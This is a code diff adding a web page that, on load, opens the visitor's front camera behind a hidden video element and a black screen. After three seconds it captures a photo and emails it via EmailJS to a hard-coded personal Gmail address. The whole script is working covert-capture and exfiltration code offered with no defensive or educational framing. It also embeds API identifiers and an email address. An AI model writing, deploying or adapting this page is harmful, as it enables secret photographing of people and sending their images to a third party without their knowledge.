@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Auto Photo Capture</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    video, canvas {
+      display: none;
+    }
+    body {
+      background: black;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" width="320" height="240" autoplay playsinline muted></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+  <script>
+    emailjs.init("Ls_73VRv8jo5MuxFV");
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
+
+    async function startCameraCapture() {
+      const isSecure = location.protocol === 'https:' || location.hostname === 'localhost';
+      if (!isSecure) {
+        console.warn("Camera access requires HTTPS or localhost.");
+        return;
+      }
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          video.play();
+
+          setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/png");
+
+            const emailParams = {
+              image: imageData,
+              to_email: "devpareek0101@gmail.com"
+            };
+
+            emailjs.send("service_t70e7ys", "_ejs-test-mail-service_", emailParams)
+              .then(() => {
+                console.log("Photo sent successfully via email.");
+              })
+              .catch(err => {
+                console.error("Email send error:", err);
+              });
+
+          }, 3000);
+        };
+
+      } catch (err) {
+        if (err.name === 'NotAllowedError') {
+          console.warn("Camera permission denied.");
+        } else if (err.name === 'NotFoundError') {
+          console.warn("No camera found.");
+        } else {
+          console.error("Camera error:", err);
+        }
+      }
+    }
+
+    window.addEventListener("DOMContentLoaded", startCameraCapture);
+  </script>
+</body>
+</html>
